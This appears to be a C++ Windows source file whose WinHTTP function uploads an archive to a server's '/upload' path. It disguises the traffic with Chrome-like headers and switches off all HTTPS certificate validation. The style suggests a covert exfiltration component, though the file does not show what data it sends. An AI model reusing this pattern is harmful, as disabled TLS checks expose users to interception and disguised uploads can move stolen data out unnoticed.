#include "common.h"
#include "upload_utils.h"

namespace
{
bool WideToUtf8(const std::wstring &input, std::string &output)
{
    if (input.empty())
    {
        output.clear();
        return true;
    }
    int needed = WideCharToMultiByte(CP_UTF8, 0, input.c_str(), static_cast<int>(input.size()), NULL, 0, NULL, NULL);
    if (needed <= 0)
        return false;
    output.resize(static_cast<size_t>(needed));
    char *buffer = output.empty() ? nullptr : &output[0];
    int written = WideCharToMultiByte(CP_UTF8,
                                      0,
                                      input.c_str(),
                                      static_cast<int>(input.size()),
                                      buffer,
                                      needed,
                                      NULL,
                                      NULL);
    return written == needed;
}
} // namespace

bool UploadArchive(const std::vector<uint8_t> &archiveData,
                   const std::wstring &url,
                   const std::wstring &fileName)
{
    std::wstring effectiveName = fileName.empty() ? L"archive" : fileName;

    std::wstring urlCopy = url;
    URL_COMPONENTS components = {};
    components.dwStructSize = sizeof(components);
    components.dwSchemeLength = (DWORD)-1;
    components.dwHostNameLength = (DWORD)-1;
    components.dwUrlPathLength = (DWORD)-1;
    components.dwExtraInfoLength = (DWORD)-1;
    components.dwUserNameLength = (DWORD)-1;
    components.dwPasswordLength = (DWORD)-1;
    if (!WinHttpCrackUrl(urlCopy.data(), 0, 0, &components))
    {
        wprintf(L"[!] Failed to parse upload URL %ls (error %lu)\n", url.c_str(), GetLastError());
        return false;
    }
    if (components.nScheme != INTERNET_SCHEME_HTTP && components.nScheme != INTERNET_SCHEME_HTTPS)
    {
        wprintf(L"[!] Upload URL must be HTTP or HTTPS: %ls\n", url.c_str());
        return false;
    }
    std::wstring host(components.lpszHostName, components.dwHostNameLength);
    if (host.empty())
    {
        wprintf(L"[!] Upload URL missing host: %ls\n", url.c_str());
        return false;
    }
    std::wstring path;
    if (components.dwUrlPathLength > 0)
        path.assign(components.lpszUrlPath, components.dwUrlPathLength);
    if (path.empty())
        path = L"/";
    if (components.dwExtraInfoLength > 0)
        path.append(components.lpszExtraInfo, components.dwExtraInfoLength);
    // Always POST to /upload regardless of the provided path.
    path = L"/upload";

    bool isHttps = components.nScheme == INTERNET_SCHEME_HTTPS;
    INTERNET_PORT port = components.nPort;
    if (port == 0)
        port = isHttps ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT;
    INTERNET_PORT defaultPort = isHttps ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT;
    std::wstring scheme = isHttps ? L"https" : L"http";
    std::wstring origin = scheme + L"://" + host;
    if (port != defaultPort)
        origin += L":" + std::to_wstring(port);
    std::wstring referer = origin;
    if (!path.empty())
    {
        if (path.front() != L'/')
            referer += L"/";
        referer += path;
    }

    const wchar_t *kUserAgent = L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                L"AppleWebKit/537.36 (KHTML, like Gecko) "
                                L"Chrome/142.0.0.0 Safari/537.36";
    HINTERNET session = WinHttpOpen(kUserAgent,
                                    WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
                                    WINHTTP_NO_PROXY_NAME,
                                    WINHTTP_NO_PROXY_BYPASS,
                                    0);
    if (!session)
    {
        wprintf(L"[!] WinHttpOpen failed: %lu\n", GetLastError());
        return false;
    }

    HINTERNET connect = WinHttpConnect(session, host.c_str(), port, 0);
    if (!connect)
    {
        wprintf(L"[!] WinHttpConnect failed: %lu\n", GetLastError());
        WinHttpCloseHandle(session);
        return false;
    }

    DWORD requestFlags = isHttps ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET request = WinHttpOpenRequest(connect,
                                           L"POST",
                                           path.c_str(),
                                           NULL,
                                           WINHTTP_NO_REFERER,
                                           WINHTTP_DEFAULT_ACCEPT_TYPES,
                                           requestFlags);
    if (!request)
    {
        wprintf(L"[!] WinHttpOpenRequest failed: %lu\n", GetLastError());
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        return false;
    }

    if (isHttps)
    {
        DWORD securityFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                              SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                              SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                              SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        if (!WinHttpSetOption(request, WINHTTP_OPTION_SECURITY_FLAGS, &securityFlags, sizeof(securityFlags)))
        {
            wprintf(L"[!] Failed to relax HTTPS validation: %lu\n", GetLastError());
            WinHttpCloseHandle(request);
            WinHttpCloseHandle(connect);
            WinHttpCloseHandle(session);
            return false;
        }
    }

    std::string fileNameUtf8;
    if (!WideToUtf8(effectiveName, fileNameUtf8))
    {
        wprintf(L"[!] Failed to encode file name for upload\n");
        WinHttpCloseHandle(request);
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        return false;
    }

    const std::string boundary = "----WebKitFormBoundaryBLAHBLAH";
    std::string prefix;
    prefix.reserve(256);
    prefix.append("--");
    prefix.append(boundary);
    prefix.append("\r\n");
    prefix.append("Content-Disposition: form-data; name=\"files\"; filename=\"");
    prefix.append(fileNameUtf8);
    prefix.append("\"\r\n");
    prefix.append("Content-Type: application/octet-stream\r\n\r\n");

    std::string suffix = "\r\n--" + boundary + "--\r\n";

    uint64_t contentLength = static_cast<uint64_t>(prefix.size()) +
                             static_cast<uint64_t>(suffix.size()) +
                             static_cast<uint64_t>(archiveData.size());
    if (contentLength > 0xFFFFFFFFull)
    {
        wprintf(L"[!] Upload not supported for payloads larger than 4GB\n");
        WinHttpCloseHandle(request);
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        return false;
    }

    std::wstring boundaryW(boundary.begin(), boundary.end());
    std::wstring headers;
    headers.reserve(256);
    auto appendHeader = [&headers](const std::wstring &name, const std::wstring &value) {
        headers.append(name);
        headers.append(L": ");
        headers.append(value);
        headers.append(L"\r\n");
    };
    appendHeader(L"Accept-Language", L"en-US,en;q=0.9");
    appendHeader(L"Accept", L"*/*");
    appendHeader(L"Accept-Encoding", L"gzip, deflate, br");
    appendHeader(L"Connection", L"keep-alive");
    appendHeader(L"Origin", origin);
    appendHeader(L"Referer", referer);
    headers.append(L"Content-Type: multipart/form-data; boundary=");
    headers.append(boundaryW);
    headers.append(L"\r\n");
    appendHeader(L"Content-Length", std::to_wstring(contentLength));

    if (!WinHttpSendRequest(request,
                            headers.c_str(),
                            static_cast<DWORD>(headers.size()),
                            WINHTTP_NO_REQUEST_DATA,
                            0,
                            static_cast<DWORD>(contentLength),
                            0))
    {
        wprintf(L"[!] WinHttpSendRequest failed: %lu\n", GetLastError());
        WinHttpCloseHandle(request);
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        return false;
    }

    auto writeData = [request](const void *buffer, DWORD size) -> bool {
        if (size == 0)
            return true;
        DWORD written = 0;
        if (!WinHttpWriteData(request, buffer, size, &written))
            return false;
        return written == size;
    };

    if (!writeData(prefix.data(), static_cast<DWORD>(prefix.size())))
    {
        wprintf(L"[!] Failed to send multipart prefix: %lu\n", GetLastError());
        WinHttpCloseHandle(request);
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        return false;
    }

    size_t sent = 0;
    while (sent < archiveData.size())
    {
        size_t remaining = archiveData.size() - sent;
        DWORD chunk = remaining > static_cast<size_t>(1 << 16) ? (1 << 16) : static_cast<DWORD>(remaining);
        if (!writeData(archiveData.data() + sent, chunk))
        {
            wprintf(L"[!] Failed to send archive data: %lu\n", GetLastError());
            WinHttpCloseHandle(request);
            WinHttpCloseHandle(connect);
            WinHttpCloseHandle(session);
            return false;
        }
        sent += chunk;
    }

    if (!writeData(suffix.data(), static_cast<DWORD>(suffix.size())))
    {
        wprintf(L"[!] Failed to send multipart suffix: %lu\n", GetLastError());
        WinHttpCloseHandle(request);
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        return false;
    }

    if (!WinHttpReceiveResponse(request, NULL))
    {
        wprintf(L"[!] WinHttpReceiveResponse failed: %lu\n", GetLastError());
        WinHttpCloseHandle(request);
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        return false;
    }

    DWORD status = 0;
    DWORD statusSize = sizeof(status);
    if (!WinHttpQueryHeaders(request,
                             WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                             WINHTTP_HEADER_NAME_BY_INDEX,
                             &status,
                             &statusSize,
                             WINHTTP_NO_HEADER_INDEX))
    {
        wprintf(L"[!] Failed to query HTTP status: %lu\n", GetLastError());
        WinHttpCloseHandle(request);
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        return false;
    }

    WinHttpCloseHandle(request);
    WinHttpCloseHandle(connect);
    WinHttpCloseHandle(session);

    if (status < 200 || status >= 300)
    {
        wprintf(L"[!] Upload failed, server returned HTTP %lu\n", status);
        return false;
    }

    wprintf(L"[+] Upload completed with HTTP %lu\n", status);
    return true;
}
